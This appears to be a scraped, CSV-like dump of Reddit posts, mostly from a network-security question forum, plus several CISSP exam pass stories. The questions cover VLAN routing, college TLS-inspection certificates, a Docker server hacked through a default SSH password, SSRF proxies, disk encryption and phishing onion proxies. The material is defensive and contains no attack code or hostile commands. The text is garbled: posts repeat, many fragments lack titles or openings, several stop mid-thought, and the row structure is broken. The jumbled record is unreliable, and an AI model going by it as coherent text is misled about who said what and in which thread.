I'm a penetration tester that runs a non-profit in San Diego, CA and teaches cybersecurity at a middle school and high school in the area (Cyberpatriot and some CTFs). Looking to get some feedback on this video I just put together as I'm starting to get lectures together for this year. Hopefully this is allowed, please lmk if it's not--sounds like advertising is banned but I'm hoping this is different enough, I'm not monetized on YT fwiw.

I just want to make sure I'm not passing on some blatantly incorrect information.

3,pabhxr,How is this website blocking Inspect or Elements when you try to inspect?,"I noticed this on a lot of streaming sites in particular and it got me curious..

for example [hurawatch.ru](https://hurawatch.ru) is a streaming site for tv shows and movies. 

If you use Chrome and Inspect, it will seem to fire off a debugger and you can't close out of it. 

If I use firefox, it will allow me to inspect the page but the video player is hidden until you close the inspector.

5,p721ku,"VLANS, L3 routing, large amounts of data, CPU intensive -- doesn't make sense","I'm not an expert in networking or VLANs but get L3 routing is done by the CPU. This means sending large amounts of data between VLANs can be very CPU intensive. This is the reason they say security cameras should not be on a different VLAN than where the feed is going (i.e. an NVR).

But this doesn't add up to me. It's not like the traffic is physically going down a different circuit. **The CPU has to determine where all tagged traffic goes -- be it on the same VLAN or a different one, right?**

What am I missing? Why is it common advice to put things like security cameras on the same VLAN as the feed destination?",2021-08-18
6,p9ymqg,"Will a VPN secure my traffic on my college's wifi network, which requires I install a certificate?","Hi,

I asked this on r/vpn but got kind of mixed answers, so thought I might ask here for potentially more expertise. 

I was setting up my phone on my college's wifi the other day, and it required that I install a certain certificate on my phone in order to connect. When installing this certificate, I got a prompt from android that said “Note: The issuer of this certificate may inspect all traffic to and from the device.” Seeing as I don't necessarily want my university being able to monitor literally everything I do on my phone, I was wondering if a VPN would help secure my traffic with this. My college doesn't prohibit vpn usage fwiw.

But since i am undergrad ,i wanted to explore some binary exploitation with RE . So i thought that mobile games hacking could be the way? 

Like  finding bugs in mobile games and reporting them to game companies,but I can’t find any vulnerability disclosures programs or platforms like in web hackings(bugcrowd&amp;hackerone). 

So my question:

Is mobile game hacking considered an experience of reverse engineering on resume ? That besides analysing malware could give me advantages?

Is it same as web hacking? I find bugs and report it and that it ? I see many people just selling cheats but I don’t want to do that since it’s illegal.",2021-08-20

We at r/AskNetsec would like to introduce you to our new ""Segment"" State Of the Sub, For the next few months, this will be released at the end of each month as a way of transparency between the mod team and you guys.

&#x200B;

**New Moderators**

In the wake of the old mods, Seven new moderators have been added to help around. They have individually been selected based on experience in the field and a few other selected qualities. They are subject to the same rules as the rest of you, so please feel free to report any all rule-breaking posts, even if it comes from a moderator. (Abuse will result in a perm ban)

**The** ***filter***

As I'm sure most of you all have noticed, posts are now going through instead of being held up in the mod queue like they were for months. This filter is still being monitored for rule-breaking posts, and other issues so do keep that in mind. Unfortunately, there were *thousands* of posts in the queue so to lessen our workload most were removed besides those of around 30\~ or fewer days old.

*Please report any issues with the filter in mod mail and we will work on fixing it asap.*

**Post Rules**

As a team, we have decided that this sub's focus will be more technical. That means that questions related to career advice, what cert to get, how to get started, etc, should be posted to places like: r/SecurityCareerAdvice, /r/NetSecStudents, /r/ITCareerQuestions, etc. We will be removing posts that violate this rule.

**Bans**

As every new administration does, we've looked through the bans and noticed many valid and invalid bans and will like to open the opportunity for all previously banned users to appeal via mod mail. These will be done case by case and may take a bit if there is a backlog.

OVH sent me an email.  I updated everything and restarted (hoping it was just a docker image that got hacked and not the root of server) and all the erroneous processes stopped but while I was sleeping the server got re-exploited and by morning my host had disabled them.

The only non-docker services I run on the servers are nginx & ssh.  I do have password auth enabled (yeah yeah I know) but I don't think both would have been bruteforced at the same time so this feels like an exploit of some sort.  Are there any major docker vulnerabilities that would allow this?

I have other servers that didn't get touched but they were setup more recently and have latest version of docker on them.

Both servers are now in recovery mode.  I am going to nuke from orbit as soon as I recover data but is there anything quick I should look at before hand to get a clue how they got in?

61,p5i0db,How to keep an accurate Endpoint inventory?,"Actively managing inventory seems very important to ensure other controls can be effective.

It also helps investigating security incidents by knowing which endpoints belong to a user, what IP address it has and what OS release version it is running. Even better if these bits of information are tracked over time so that at any given time it is known what the state of the machine was (e.g. IP can change, user assigned to host can change etc). 

Are there any good supporting tools that can keep a dynamic inventory? 

I find it increasingly frustrating to not be able to answer security related questions because I don't know what the state of the system was at a given time in the past and often even in the present, as the information is spread over various systems ranging from MDM to patch management as well as endpoint protection.

But how do larger organisations utilise PBD/NBDE? 

They can roll out NBDE to get some kind of transparent encryption where the end user does not have to interact with the encryption, since the machine boots up without the need to enter a password or put in a token/smart card. But against which threat does this defend? 

Full disk encryption is IMO mostly useful on mobile devices that can easily get lost or stolen or be tampered with in your hotel room while you are attending a conference dinner. So outside of your organisation's network NBDE doesn't make any sense except that you don't have to enter your password while in office and connected to the network with the tang server.

NBDE on machines that never leave the office building only makes sense to me as a tool to avoid annoying the users by not having them to enter a password. 

Servers/VMs can get FDE via LUKS and NBDE in a way such they also can reboot without any interaction. Which is nice, but the typical threat to servers isn't the adversary in the building who steals the drive from the 19"" rack. 

I have seen some slides from McCallum, where he suggest more sophisticated policy based models by combining multiple factors/techniques like tang/clevis and a yubikey token. But I haven't found examples of this in the wild yet.

I had what just seemed like a weird video card issue shortly after doing so this morning, but I checked the security logs in event viewer after, and I saw a strange Windows error related to decryption in the Microsoft Software Key Storage Provider.

97,oxoqy4,How vunerable to identity theft is personally identifying information sent over standard email in 2021?,"I'd value some netsec specialist views on the vulnerablity of standard email to identity theft in 2021.

Let our scenario be that an organisation, like a real estate agent or government organisation, reasonably requires personally identifying information (for example in the form of copies of a passport and birth certificate) but they solicit that information over standard email: sendocs@example.org. You send the passport and birth certificate as unencrypted email attachments.

What is the likelihood that identity thieves are able to intercept those documents? You might like to speak to factors in 2021 such as: the likelihood that email servers will have secure connections between them; the likelihood of email server hard drives being properly encrypted; or any other consideration you'd like to bring to bear.

I'm a hedge fund analyst looking at a pending cybersecurity IPO. $1.4 billion valuation

I'm skeptical for several reasons but lack the technical background. Company is very heavy on buzzwords (Quantum, SaaS/PaaS, cloud, blockchain, ""deep tech"").  

The company claims ""future-proofed"" software against quantum computing, calling themselves ""a leader in quantum encryption technology"".

From what I gather, their product is a symmetric encryption method. Specifically, they claim ""Although symmetric encryption keys are secure, to date there has been no secure way to create and distribute symmetric keys electronically. Arqit’s groundbreaking technology has solved these known issues.""  (Arqit's Prospectus, page 27).

One decision I am stuck on that I would really appreciate input and guidance on is whether to go with applocker/ Device Guard with Windows 10 Enterprise LTSC or to go with Threatlocker which does seem like a well thought out product that also includes elevation control and ringfencing along with application control. It would more than double the cost per endpoint when combined with SentinelOne though which makes me hesitant. We already need to purchase LTSC for our frontline worker stations so that is a significant yearly added expense.

I know that FortiAnalyzer is not really a proper SIEM tool, but it fits within our budget and seems like a pretty good product and is way more affordable than FortiSIEM.

132,op3w4b,GPEN or GWAPT? (I don't have to pay for either),"Hi. I was hoping to hear the community's thoughts about these certs. I am really torn over what I should take.   


I am not working full time in the industry yet, but I have an opportunity to take one of these courses for free to put it simply to help me jumpstart things. Regardless of what I pick, I intend to pursue a SANs cert.   


I am familiar with the SANs meta (the index) and I am really looking more towards understanding the differences between the two certs and how it impacts job prospects moreso than how to pass them.   


One of my concerns is I heard GPEN is very Windows heavy; with that said, I also heard the GPEN covers things such as lateral movement and post exploitation, which are things I would like to explore more. To those who have taken the GPEN, was the material taught applicable to other configurations (non-windows systems) once you have knowledge of the other technologies and the GPEN-taught methodologies available ?   


In terms of career prospects, I would like to work in DFIR, especially in mobile forensics. I am aware SANS has forensics-specific courses, but it is not available to me in this circumstance I am in where I can get a SANS cert for free. The catalog available for me to choose from has the GPEN and GWAPT standing out the most to me.   


Considering most mobile devices are attacked via applications, which are constantly connected to clouds and remote servers, I thought web app pen testing might be a good fit. Is the GWAPT very narrow in that respect? is there anything with respect to pivoting or post exploitation covered in that class, or is it merely attacks against public facing systems (and what can be gained at that point in a network)?   


Correct me if I am wrong, but my understanding of the two certs are as follows:  


GPEN: Recon -> Scanning -> exploitation -> post-exploitation  
but all done on Windows Systems  


GWAPT: Recon-> Scanning->exploitation  
but extensively covers a variety of web technologies.   


Long-term, I'd like to take the OSCP one day (just to say I have it) so it is on my radar but not for right now. I am aware it is an entirely different beast from GPEN.   


Another thing I've considered is take the GPEN to go through the entire pentesting methodology, then take something in my financial means like a elearn security cert to fill in the gaps in my web app understanding ( hear those certs are more hands on too).   


I have some work prospects in DFIR at the moment, but if I don't end up in DFIR, I see myself going into red teaming anyway; I like it. Does it make sense to go through the  whole pentesting process with GPEN then learn about web app security later even though web app tech is ""hot"" right now? I am also considering the industry's movement to the cloud and the reliance of web technologies further to deliver organizational needs. It's great to get something like a SANs cert for free and I don't want to blow it on something that isn't on HR's Radar or is less reputable than the other.  


 Does the GWAPT lock me out of more pentesting jobs compared to the GPEN?",2021-07-22
133,op0a1s,[Question] Deploying smokescreen to prevent SSRF,"I've been experimenting with smokescreen to handle SSRF attacks on internal infrastructure. The thing is that the service I'm working with needs to communicate with some parts of the internal infrastructure for things like authentication. Smokescreen by default blocks all connections to RFC 1918 addresses. An idea I had was to create a whitelist for internal ip addresses but I can't help but wonder if that defeats the whole purpose of a SSRF protection proxy as there are still some internal traffic allowed.  


I'm wondering if in this case if my thinking is correct or if anyone has had experience deploying these SSRF proxies.

154,pa80mi,Analyzing an onion phishing proxy....?,"So there are a bunch of subreddits with phishing links on the sidebar posing as darknet markets, scamming people daily. Reddit won't verify the real vs phishing links since they're onions even though I reported them months ago.

I've been using dev tools (f12) in the browser to look for differences between the real and phishing sites. 

I'm looking for any other tools that could scan or prove beyond a reasonable doubt that it's a proxy server, but the normal tools don't work on onion sites.

One of the key differences I've found is the network timings between phishing links and the official links. [Example](https://i.imgur.com/JpjAudH.jpg), seems pretty clear it's a proxy that does forward requests back and forth to the genuine site, but when you go to transfer crypto they intercept it or substitute their wallet address for the real one.

Normally people would pgp verify the site, however since the proxy does interact with the real site, it does have a valid pgp signature.

Another detail I've found that differs between the phishing and real site is the phishing site throws 2 warnings the real site doesn't:

>Some cookies are misusing the recommended ""samesite"" attribute.

The official mirrors list has 8 different URLs, every single one of them shows the same network timing without the proxy, while almost every link I've found on reddit have the phishing timings. (picture above).",2021-08-23

The only non-docker services I run on the servers are nginx & ssh.  I do have password auth enabled (yeah yeah I know) but I don't think both would have been bruteforced at the same time so this feels like an exploit of some sort.  Are there any major docker vulnerabilities that would allow this?

I have other servers that didn't get touched but they were setup more recently and have latest version of docker on them.

edit: I found a docker image common to both servers that had a default SSH password set from a well known project template.  When I logged into hacked server there were a ton of rsync processes and various nefarious processes running so first thing i did was stop the docker service to see if they stopped but they carried on with the docker service stopped.  Does this rule out this container as point of entry?

&#x200B;

edit: I am 90% sure now that it was this default ssh password on docker container that was to blame and servers are actually fine with this container removed.  I am going to delay nuking them from orbit to see if they get rehacked without this container.",2021-08-17

181,p5m81j,State of The Subreddit - #1 - 08/2021,"**Hello Everyone!**

We at r/AskNetsec would like to introduce you to our new ""Segment"" State Of the Sub, For the next few months, this will be released at the end of each month as a way of transparency between the mod team and you guys.

&#x200B;

**New Moderators**

In the wake of the old mods, Seven new moderators have been added to help around. They have individually been selected based on experience in the field and a few other selected qualities. They are subject to the same rules as the rest of you, so please feel free to report any all rule-breaking posts, even if it comes from a moderator. (Abuse will result in a perm ban)

**The** ***filter***

As I'm sure most of you all have noticed, posts are now going through instead of being held up in the mod queue like they were for months. This filter is still being monitored for rule-breaking posts, and other issues so do keep that in mind. Unfortunately, there were *thousands* of posts in the queue so to lessen our workload most were removed besides those of around 30\~ or fewer days old.

*Please report any issues with the filter in mod mail and we will work on fixing it asap.*

**Post Rules**

As a team, we have decided that this sub's focus will be more technical. That means that questions related to career advice, what cert to get, how to get started, etc, should be posted to places like: r/SecurityCareerAdvice, /r/NetSecStudents, /r/ITCareerQuestions, etc. We will be removing posts that violate this rule.

**Bans**

As every new administration does, we've looked through the bans and noticed many valid and invalid bans and will like to open the opportunity for all previously banned users to appeal via mod mail. These will be done case by case and may take a bit if there is a backlog.

&#x200B;

That's all for today folks, I hope you've all had a good weekend and I'll see you all again next month.",2021-08-16
182,p5i0db,How to keep an accurate Endpoint inventory?,"Actively managing inventory seems very important to ensure other controls can be effective.

It also helps investigating security incidents by knowing which endpoints belong to a user, what IP address it has and what OS release version it is running. Even better if these bits of information are tracked over time so that at any given time it is known what the state of the machine was (e.g. IP can change, user assigned to host can change etc). 

Are there any good supporting tools that can keep a dynamic inventory? 

I find it increasingly frustrating to not be able to answer security related questions because I don't know what the state of the system was at a given time in the past and often even in the present, as the information is spread over various systems ranging from MDM to patch management as well as endpoint protection. The system could also be off radar because security tooling was not installed.

I'm looking for a system that can incorporate the different angles into one central view but so far haven't been able to find anything reliable.",2021-08-16

184,p4tutt,Security flaw - credentials stored in plain text,"I learned about a serious security flaw, which shocked me a bit. It is about a software, which is critical for the work of a company. Sensitive company data is stored in the database.

The program is installed on every computer in the company. In the installation directory of the program there is a configuration file. In this file credentials for the database are stored. The credentials are not only stored in plain text, but also bring increased privileges. The manufacturer of the software says that this is how it is supposed to be.

I can't believe this. In my eyes, this not only violates information security principles, but is certainly illegal. I can imagine that it is a violation of the GDPR as well.

How to proceed in that case? My idea is to document everything and communicate it in writing to the management. Also, in some way contact the manufacturer of the software. Unfortunately, I have no experience in this area and hope to get support here.",2021-08-15

Due to the way we work, we do not have an internal infrastructure (AD) per se, we manage the workstation for JAMF and zero trust models. But that's another story. We use the Hive and ELK.

I am not an expert in logging/IR/blue side, so please do share any guides or advice on this.

190,p3nl5z,"Use cases for policy based decryption, especially NBDE / clevis and tang","I am interested in the use cases for network bound disk encryption, especially in larger environments. I have setup NBDE with clevis and tang in 2 VMs with Ubuntu, and it works quite well. 

But how do larger organisations utilise PBD/NBDE? 

They can roll out NBDE to get some kind of transparent encryption where the end user does not have to interact with the encryption, since the machine boots up without the need to enter a password or put in a token/smart card. But against which threat does this defend? 

Full disk encryption is IMO mostly useful on mobile devices that can easily get lost or stolen or be tampered with in your hotel room while you are attending a conference dinner. So outside of your organisation's network NBDE doesn't make any sense except that you don't have to enter your password while in office and connected to the network with the tang server.

NBDE on machines that never leave the office building only makes sense to me as a tool to avoid annoying the users by not having them to enter a password. 

Servers/VMs can get FDE via LUKS and NBDE in a way such they also can reboot without any interaction. Which is nice, but the typical threat to servers isn't the adversary in the building who steals the drive from the 19"" rack. 

I have seen some slides from McCallum, where he suggest more sophisticated policy based models by combining multiple factors/techniques like tang/clevis and a yubikey token. But I haven't found examples of this in the wild yet. 

So what are usecases for larger organisations? How do they benefit from NBDE/PBD especially on end user machines like laptops?",2021-08-13

Also I noticed some ads on Youtube videos regarding VPNs also seem scare users on public networks like a local coffee shop, but as long as they are using the guest network feature on the Wifi Router (if it exists) they should be ok right?

I've generally heard that we should use SSH keys instead of interactive passwords when connecting from one Unix-like system (e.g. Linux, FreeBSD, etc.) to another because it provides better protection.  However, as I understand the design, it assumes that the key files are not compromised.  In Zero Trust design, we assume that all hosts are compromised, though.

So how do we reconcile those two ideas?  Should I be using something besides SSH keys or passwords?  Is there something about the keys that I'm missing?  Is the Zero Trust design relying on centralized authentication, such as AD, LDAP, or Kerberos to make authentication automatic?

219,oxoqy4,How vunerable to identity theft is personally identifying information sent over standard email in 2021?,"I'd value some netsec specialist views on the vulnerablity of standard email to identity theft in 2021.

Let our scenario be that an organisation, like a real estate agent or government organisation, reasonably requires personally identifying information (for example in the form of copies of a passport and birth certificate) but they solicit that information over standard email: sendocs@example.org. You send the passport and birth certificate as unencrypted email attachments.

What is the likelihood that identity thieves are able to intercept those documents? You might like to speak to factors in 2021 such as: the likelihood that email servers will have secure connections between them; the likelihood of email server hard drives being properly encrypted; or any other consideration you'd like to bring to bear.

In order to not have to dig through all results and remove false positives manually it would be extremely helpful to have open source code of which the vulnerable places are known and categorized.

&#x200B;

I'm a hedge fund analyst looking at a pending cybersecurity IPO. $1.4 billion valuation

I'm skeptical for several reasons but lack the technical background. Company is very heavy on buzzwords (Quantum, SaaS/PaaS, cloud, blockchain, ""deep tech"").  

The company claims ""future-proofed"" software against quantum computing, calling themselves ""a leader in quantum encryption technology"".

From what I gather, their product is a symmetric encryption method. Specifically, they claim ""Although symmetric encryption keys are secure, to date there has been no secure way to create and distribute symmetric keys electronically. Arqit’s groundbreaking technology has solved these known issues.""  (Arqit's Prospectus, page 27).

I'm very curious your take on this innovation and the market potential for this product. I have my own view, but greatly value your opinion. Cheers everyone.

My plan is to build our security infrastructure in layers to better address a lot of the attacks that seem to be taking down even large corporations and infrastructure providers.

One decision I am stuck on that I would really appreciate input and guidance on is whether to go with applocker/ Device Guard with Windows 10 Enterprise LTSC or to go with Threatlocker which does seem like a well thought out product that also includes elevation control and ringfencing along with application control. It would more than double the cost per endpoint when combined with SentinelOne though which makes me hesitant. We already need to purchase LTSC for our frontline worker stations so that is a significant yearly added expense.

I know that FortiAnalyzer is not really a proper SIEM tool, but it fits within our budget and seems like a pretty good product and is way more affordable than FortiSIEM.

254,op3w4b,GPEN or GWAPT? (I don't have to pay for either),"Hi. I was hoping to hear the community's thoughts about these certs. I am really torn over what I should take.   


I am not working full time in the industry yet, but I have an opportunity to take one of these courses for free to put it simply to help me jumpstart things. Regardless of what I pick, I intend to pursue a SANs cert.   


I am familiar with the SANs meta (the index) and I am really looking more towards understanding the differences between the two certs and how it impacts job prospects moreso than how to pass them.   


One of my concerns is I heard GPEN is very Windows heavy; with that said, I also heard the GPEN covers things such as lateral movement and post exploitation, which are things I would like to explore more. To those who have taken the GPEN, was the material taught applicable to other configurations (non-windows systems) once you have knowledge of the other technologies and the GPEN-taught methodologies available ?   


In terms of career prospects, I would like to work in DFIR, especially in mobile forensics. I am aware SANS has forensics-specific courses, but it is not available to me in this circumstance I am in where I can get a SANS cert for free. The catalog available for me to choose from has the GPEN and GWAPT standing out the most to me.   


Considering most mobile devices are attacked via applications, which are constantly connected to clouds and remote servers, I thought web app pen testing might be a good fit. Is the GWAPT very narrow in that respect? is there anything with respect to pivoting or post exploitation covered in that class, or is it merely attacks against public facing systems (and what can be gained at that point in a network)?   


Correct me if I am wrong, but my understanding of the two certs are as follows:  


GPEN: Recon -> Scanning -> exploitation -> post-exploitation  
but all done on Windows Systems  


GWAPT: Recon-> Scanning->exploitation  
but extensively covers a variety of web technologies.   


Long-term, I'd like to take the OSCP one day (just to say I have it) so it is on my radar but not for right now. I am aware it is an entirely different beast from GPEN.   


Another thing I've considered is take the GPEN to go through the entire pentesting methodology, then take something in my financial means like a elearn security cert to fill in the gaps in my web app understanding ( hear those certs are more hands on too).   


I have some work prospects in DFIR at the moment, but if I don't end up in DFIR, I see myself going into red teaming anyway; I like it. Does it make sense to go through the  whole pentesting process with GPEN then learn about web app security later even though web app tech is ""hot"" right now? I am also considering the industry's movement to the cloud and the reliance of web technologies further to deliver organizational needs. It's great to get something like a SANs cert for free and I don't want to blow it on something that isn't on HR's Radar or is less reputable than the other.  


 Does the GWAPT lock me out of more pentesting jobs compared to the GPEN?",2021-07-22

Please help!","For my university course, there is a scenario-based question that  outlines the concept behind Gateway Authentication, and the wording of  it has me somewhat confused about whether this could be referring to  Confidentiality or Integrity.

The rationale in the scenario is:

*Gateway authentication ensures users and services are authenticated  by gateways to reduce the likelihood of unauthorised access and provide  an auditing capability to support the investigation of cybersecurity  incidents.*

The question it asks is, *if an organisation must meet a control  ""Users and services accessing networks through gateways are authenticated"" is this fundamentally addressing Confidentiality,  Integrity, or Availability?*

My confusion is that - could it not be Confidentiality because (in my  view) the whole reason behind authenticating a User or Service is to  prevent unauthorised parties/services from traversing through the  Gateway?

But then - could it not be Integrity since we are ""authenticating""  the users/services to validate that they are who/what they say they are,  and effectively confirming they are permitted to traverse through the gateway?",2021-07-10

I am assisting a very close friend who recently lost their spouse suddenly.

While going through their papers, she found the information to the wallet along with multiple passwords, but she cannot get past the 2FA confirmation for because their number has already been recycled by the carrier.

We tried to get in touch with the new holder of the number with no response.

From a legal standpoint, they are the spouse and executor of their will, but is there a way to get the carrier to provide the 2FA Code, and they would be willing to get a court order if that's the best/only way to go about it.

287,pabhis,Provisionally passed! Here's what worked for me.,"I provisionally passed!  I am posting this to give back because I found these kinds of posts motivating when I was preparing.  Also, it's a little cathartic.  Of course, your experience will be different but here's what worked for me.

For context, I have around 15 years of experience in cyber security technical and management roles, and had just never got around to doing the test.  Like others, booking a date helped sharpen my focus.  

I have experience in most of the domains except SDLC, so my study needs were to validate what I thought I knew and then to fill in gaps where I didn't have as much experience.  It turned out I had more gaps than expected in domains I thought I was strong in (eg. crypto), and fewer in the gaps where I thought I was weak (eg. SDLC).  I also have a lot of multiple choice test experience from other exams like the LSAT, and this definitely helped.

**My approach**

\- I did practice questions with the Pocket Prep app (now called IT & Security) to assess where I stood on the domains.

\- Then I zeroed in on my weak domains and topics I kept missing in practice.  I used ""70 Tips and Tricks for Mastering the CISSP Exam"" by R. Sarma Danturhi to get a good, concise overview of specific topics.

\- After reaching saturation on Pocket Prep I started doing the Boson practice exams.  I made careful notes from the Pocket Prep and Boson explanations of questions I missed, and made flashcards with a free app called Rolandos to drill on recurring gaps.

\- I prioritized rote memorization of only a handful of core concepts that practice exams showed I was likely to need.

**General advice**

\- **Plan and visualize your visit the day** before to minimize the mental load that will be on you that day.  Look up the exam site in google maps.  Check exterior and interior photos if there are any.  Figure out parking or transport and book in advance if you can.  Plan what you'll wear into the exam room which may be warm or cool (likely to be warm given the PCs used for the exams).  Gather your IDs (you likely need at least 2) and any needed supplies (water, protein bars, etc.) in a bag that can fit in a small storage locker.  Check Covid mask requirements.  

\- Prepare yourself mentally to do 150 questions and to push onward without hesitation or self-pity if you go past 100.  A pass is a pass.

\- To paraphrase Bruce Lee, avoid practicing while overly tired.  If I was too tired, my practice scores dipped, drove down my average, and demotivated me.  When this happened, I put everything away and came back the next day, but I also made sure this didn't become an easy excuse.

\- Don't cram.  The day before my exam, I stopped studying mid-day and binged Netflix with a bag of chips in the evening.  The morning of, I was tempted to do some last minute review but stopped.  I told myself 20-30 minutes of review wasn't going to make a difference and it didn't.

\- If you have to wear a mask, take time to find one you'll be comfortable in for 1-3 hours.

\- Be ready for some bad grammar on some questions and answers that impacts their meaning; you just have to deal with it as best you can.

\- Review at least one current study resource published within the last year to prevent you from being blindsided by a new cutting edge topic or technology.  I found Mike Chapple's LinkedIn videos good for this.

**What was useful**

\- The Pocket Prep app was my main weapon of choice.  It was on my phone so I could do a quick quiz whenever I had a few minutes of downtime.  I think this was critical to getting lots of reps in.  

\- The Boson practice exams were quite good because they were challenging and very different than the Pocket Prep questions.  It was a good way to double check I was where I thought I was on the domains, and it spotlighted some new topics I hadn't encountered before.  Check this subreddit for a current discount code before you buy.

\- Danturthi's book was good for concise summaries of key topics in each domain.  He also emphasizes reading questions carefully and refactoring them in your head to remove irrelevant language, which I thought was a sound approach.

\- I found Chapple's LinkedIn videos to be up to date, well presented, and detailed.  They were also indexed to make skipping to a specific subject easy.  However, I don't learn efficiently from videos so I mostly used these to zero in on specific topics.

\- Kelly Handerhan's ""Why You Will Pass"" is a free, short, and worthwhile YouTube watch, even if just to reinforce that you should think like a manager.  I am one, so this wasn't a stretch, but it is a critical mindset to bring into the exam.

\- There are some cheat sheet style summaries which are posted in this subreddit which I found to be helpful.

**What wasn't useful**

\- I did not find the official ISC2 study app to be useful.  It didn't offer different study modes or statistics, and I think the question banks in Pocket Prep and Boson are superior for learning the domains holistically.

\- I found Kelly Handerhan's Cybrary videos to be a bit too high level for me, but I think they would be a good entry point for someone new to the field.  Her videos are very down to earth and accessible.

\- I felt that the explanations in Pocket Prep and Boson adequately covered the Shon Harris and Chapple books, so I did not feel it necessary to buy them having drilled these apps.

I hope this is helpful! Good luck!",2021-08-24
288,p8kknx,Passed at 150 8/18/21! Huge Thank You To this Sub and Few Lessons Learned,"I have been waiting to write this post for a long time. I'll try to keep it succint and useful.

Background: Retired Military with last 12 years in upper middle IT/Policy management.  Took a training camp CISSP boot camp one time a few years back before retiring. Didn't pass, it was the old 250 Q format and I scored a 600. Seeing as this course is now $5K I would not even consider it.

I knew it was passable so I set a goal to get it done. I didn't look to seriously complete that goal until around 3 months ago. Long before that I hung around this sub reading about people's successes and failures. I started in June, studied a few hours a day, with 80% of my study time devoted to the various question bank apps. I did these while on the stationary bike at the gym.

I probably bought EVERY resource on here and TRIED to get through all of them. Here's the rub...I DIDN'T NEED THEM ALL!!!  

This is where lessons learned come in, so here goes. 

1. Run your own race. Take a few practice tests and get a gauge on what you know. If you are scoring in the 50-60% rate at the start, you have a solid baseline to build on.
2. Once you get that baseline, SCHEDULE THE TEST. It is said so much here, but is the single biggest driver that will make you study.
3. THINK LIKE A MANAGER...but KNOW THE MATERIAL LIKE A TECHNICIAN. Just thinking like a manager will not get you through this test. There will be plenty of purely technical questions too.
4. The BEST study material/formats are the you ACTUALLY CONSISTENTLY DO. Don't waste money on stuff you aren't going to use. I have the shon harris book, sybex 8/9, the CBK...I got through about 30% of the content across all of these. The material bored me to tears. What I was able to consistently digest was practice questions with some delving to the books for problem areas. That said, know you will need to use SEVERAL sources...this is good for building your knowledge base, and getting used to different terms for the same thing. 
5. Don't take your practice test scores in relation to others here as some type of gospel as to whether you should test. Use them to gauge your knowledge. My highest score on Boson was 610, and my usual score was around 550. I only consistently scored in the 60s-70s on the Shon Harris online questions. Pocket prep was in the 70s too, only went up with repeat questions.
6. Do a PLEHORA of question across NUMEROUS sources. Not only does this build your knowledge base, it also builds your stamina for when you take the test. ALSO MEMORIZE the answers...people say don't that, but guess what, you are probably bound to get a few softball questions that you only get right because you memorized some obscure aspect of an answer. Learn why the answers are wrong but YES some rote memorization is required. You don't want to get a gimme vocabulary question wrong because you didn't do some basic memorizing.
7. Everyone's experience with the test is different! The test was definitely hard, but at no time did I feel like I was taking a different test that what I studied. It just fest like they worded the stuff differently. Pretty much 80% of my questions felt *vaguely familiar*.
8. Find a video bootcamp series or two and VIEW THEM IN THEIR ENTIRETY. I tried all of them and everyone learns different so you have to find the one that works for you. The right answer is the one you can get through, lol. I will just put my experience with these.                                                                         

*  Kelly Handerhan Cybrary, Rob Witcher(MindMap) --These people are doing the lord's work. I owe them largely for my pass
* Thor Pederson, I could not get through his udemy courses...hated his tests too...hhhmmm.
* Phrabh Nair -- couldn't get through his course
* Mike Chapple -- Nope couldn't get though his either
* Larry Greenblatt -- Maybe his live boot camp is better but the $99 package SUCKS! Dude is not funny! 80% nonsensical rambling, off topic banter and defensive driving class comedian level  humor, 20% actual usable insight into the test.
* That said I did at least 10% of every source I listed so take it for what that's worth.

This got real long real fast I guess the best advise is find the study materials that work for you, get a baseline and set a timeline to test, then STICK TO IT.

When you get weary, come here for motivation. That's it and THANK YOU!!!!!!!!!!",2021-08-21
289,p837ym,Passed in 100,"Passed CISSP Exam yesterday August 19 2021 in 100 questions.

For prep I used the sybex study guide 8th edition, and the online sybex practice bank included with the guide.

I read for about 1-2 hours a night most nights over the course of about three months. I did the written reviews and in-book chapter reviews at the end of each chapter. 

The last 5 days before the test I switched to the online tests. I did all of the individual chapter questions first, identified my two weakest chapters and re-reviewed them.

Then switched to the practice exams and did about three, again flagging and reviewing any concepts I was unsure of.

The exam felt difficult. I thought I actually failed when it ended at 100. I worked by eliminating wrong answers and reasoning the best choice among valid answers remaining.

I took about 90 minutes.

My advice to those preparing for the exam would be to expect the exam to be more of a reasoning exercise than memorization. The online practice exams all feel very route oriented. The actual test for me felt much more applied and required critical thinking to make the best possible choice with the limited information available. Try not to assume any facts— if it’s not explicitly written in the question you can’t assume it exists. Interestingly this skill of making critical judgments with limited time and info is required by security professionals.

Good luck!

Though this post is not about passing CISSP, but I attended my CISSP certifcation in 2018, continuously improve and learn. Being certified in CISSP isn't an end but a begin of your new journey. 

It opens you a doorway and demonstrate you have sufficient knowledge in various security domains (now 10?) and where  you can then focus on what you are lacking or you are interested further.

For those who  are not yet ready for CISSP (CISSP is not a beginner certificate), it's ok,  you can try SSCP instead as a starting point, I would strongly recommended this (though it's not the path I have taken).

I feel like I did a solid amount of preparation and I also work in the security assessment space so wanted to take a stab at it without much study time. I started July 17th and gave myself a month. I wasn't sure on how confident I would feel in that time frame so I actually didn't register until August 10th.

My last certification was Security+ and AWS:CCP which both are super straight forward. I did not feel that way about the CISSP. My confidence level was high on only about 50% of the questions.

I'm a 28M with a degree in Mechanical Engineering. I have \~2.5 years experience in a startup role specializing in solutions for Critical Infrastructure and \~2.5 years in my current role of Cyber Audit for Critical Infrastructure. That said, I've been a Cyber Security enthusiast since I was 14 when I built my first (non-malicious) phishing site.

On 6/12/2021 I managed to get a free voucher to take the CISSP exam, but it was set to expire at the end of August. I booked an exam at a local test center on 8/18/2021. I spent $0 on additional resources. I did get the ISC2 Official Practice Test book from a coworker who has his cert. My primary resource was I watched the [""CISSP Exam Cram"" videos on YouTube](https://www.youtube.com/playlist?list=PL7XJSuT7Dq_XPK_qmYMqfiBjbtHJRWigD) but I only actually watched the videos for the first 6 domains and didn't watch any of those extra ones. I took the official practice tests for the videos I did watch and I was scoring in the 70%-80% range. I probably spent \~20-25 hours studying for the exam in total.

At the end of the day, I either just got really lucky or experience actually does go a long way in preparing you for this exam (probably a little of both).

317,pabhis,Provisionally passed! Here's what worked for me.,"I provisionally passed!  I am posting this to give back because I found these kinds of posts motivating when I was preparing.  Also, it's a little cathartic.  Of course, your experience will be different but here's what worked for me.

For context, I have around 15 years of experience in cyber security technical and management roles, and had just never got around to doing the test.  Like others, booking a date helped sharpen my focus.  

I have experience in most of the domains except SDLC, so my study needs were to validate what I thought I knew and then to fill in gaps where I didn't have as much experience.  It turned out I had more gaps than expected in domains I thought I was strong in (eg. crypto), and fewer in the gaps where I thought I was weak (eg. SDLC).  I also have a lot of multiple choice test experience from other exams like the LSAT, and this definitely helped.

**My approach**

